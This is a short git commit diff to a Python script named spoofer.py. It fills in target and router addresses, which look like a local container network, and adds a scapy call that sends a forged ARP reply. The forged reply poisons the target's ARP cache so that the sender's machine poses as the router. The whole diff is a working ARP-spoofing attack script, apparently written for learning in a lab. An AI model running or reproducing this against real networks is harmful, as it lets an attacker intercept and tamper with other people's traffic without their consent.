b347d10fad4e0c1a18696ec80e60cabdc735ca8c
Rajesh1308 <rajesharulrathna@gmail.com>
2024-05-24 13:20:52 +0530

    Added address

--- ARP_Spoofing/spoofer.py
+++ ARP_Spoofing/spoofer.py
@@ -1,8 +1,10 @@
 import scapy.all as scapy
 
-target_ip = ""
-target_mac = ""
-router_ip = ""
+target_ip = "172.17.0.2"
+target_mac = "02:42:ac:11:00:02"
+router_ip = "172.17.0.1"
 
 packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
 #print(scapy.ls(scapy.ARP())) # op = 1 -> ARP request, op = 2 -> ARP response
+#print(packet.show())
+scapy.send(packet)
